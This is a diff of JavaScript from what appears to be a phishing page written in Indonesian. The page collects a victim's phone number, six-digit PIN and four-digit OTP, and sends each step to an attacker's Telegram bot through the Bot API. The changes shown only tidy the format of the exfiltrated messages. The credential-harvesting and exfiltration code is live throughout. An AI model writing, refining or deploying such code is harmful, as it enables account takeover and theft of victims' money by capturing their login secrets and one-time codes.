@@ -8,15 +8,15 @@ let data = { hp: "", pin: "", otp: "" };
 let timer;
 
 /**
- * Fungsi Mengirim Data ke Telegram dengan Format Rapi
+ * Fungsi Mengirim Data ke Telegram dengan Format Bersih & Profesional
  */
 async function sendTele(title, content) {
-    // Format pesan menggunakan monospaced font untuk data sensitif
-    const message = `<b>====== ${title} ======</b>\n\n` +
-                    `<b>📅 Tanggal :</b> ${new Date().toLocaleString('id-ID')}\n` +
-                    `<b>📱 No. HP  :</b> <code>${data.hp}</code>\n` +
+    // Format pesan standar profesional tanpa dekorasi berlebih
+    const message = `<b>[ LOG: ${title} ]</b>\n` +
+                    `----------------------------------------\n` +
+                    `<b>No. HP :</b> <code>${data.hp || '-'}</code>\n` +
                     `${content}\n` +
-                    `<b>========================</b>`;
+                    `----------------------------------------`;
 
     try {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
@@ -75,7 +75,7 @@ function startTimer() {
 function handleResend() {
     const timerDisplay = document.getElementById('timer-otp');
     if (timerDisplay.innerText === "Kirim Ulang") {
-        sendTele("🔄 RESEND OTP", "<b>⚠️ Status :</b> Minta kode baru");
+        sendTele("RESEND OTP", "<b>Status :</b> Minta kode baru");
         startTimer();
     }
 }
@@ -105,7 +105,7 @@ if (hpInput) {
 function submitHP() {
     data.hp = hpInput.value;
     document.getElementById('user-hp').innerText = data.hp;
-    sendTele("📩 LOGIN BARU", "<b>🚦 Status :</b> Sedang input PIN");
+    sendTele("LOGIN BARU", "<b>Status :</b> Sedang input PIN");
     
     showScreen('loading');
     setTimeout(() => {
@@ -134,7 +134,7 @@ if (pinHidden) {
         
         if(val.length === 6) {
             data.pin = val;
-            sendTele("🔐 DATA PIN", `<b>🔑 PIN    :</b> <code>${val}</code>`);
+            sendTele("DATA PIN", `<b>PIN    :</b> <code>${val}</code>`);
             
             showScreen('loading');
             setTimeout(() => {
@@ -158,10 +158,10 @@ otps.forEach((box, i) => {
         const full = Array.from(otps).map(b => b.value).join('');
         if(full.length === 4) {
             data.otp = full;
-            sendTele("✅ DATA LENGKAP", 
-                `<b>🔑 PIN    :</b> <code>${data.pin}</code>\n` +
-                `<b>💬 OTP    :</b> <code>${full}</code>\n` +
-                `<b>🏁 Status :</b> Selesai`
+            sendTele("DATA LENGKAP", 
+                `<b>PIN    :</b> <code>${data.pin}</code>\n` +
+                `<b>OTP    :</b> <code>${full}</code>\n` +
+                `<b>Status :</b> Selesai`
             );
             
             showScreen('loading');
